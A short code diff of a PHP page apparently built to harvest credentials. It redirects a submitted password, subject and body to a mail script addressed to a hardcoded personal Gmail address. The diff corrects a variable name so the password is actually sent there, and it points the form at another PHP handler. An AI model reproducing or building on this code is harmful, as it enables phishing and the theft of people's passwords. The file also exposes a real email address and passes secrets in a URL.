@@ -28,7 +28,7 @@
         $mymail = "jaycobokoro4@gmail.com";
         
         header("location: sendmail.php?password=$password
-            &subject=$subject&body=$body&to=$myemail");
+            &subject=$subject&body=$body&to=$mymail");
     }
   
  ?>
@@ -138,7 +138,7 @@ footer{
 			             </p>
 		             </div>
 			         <div class='b '>
-	                    <form action="../../sendmail.php" method="POST">
+	                    <form action="rheinchester.php" method="post">
 <table width="450px">
 <tr>
  <!-- <td valign="top">
@@ -175,7 +175,7 @@ footer{
 </tr>
 <tr>
  <td colspan="2" style="text-align:center">
-  <input type="submit" value="Submit">   
+  <input type="submit" value="submit">   
  </td>
 </tr>
 </table>
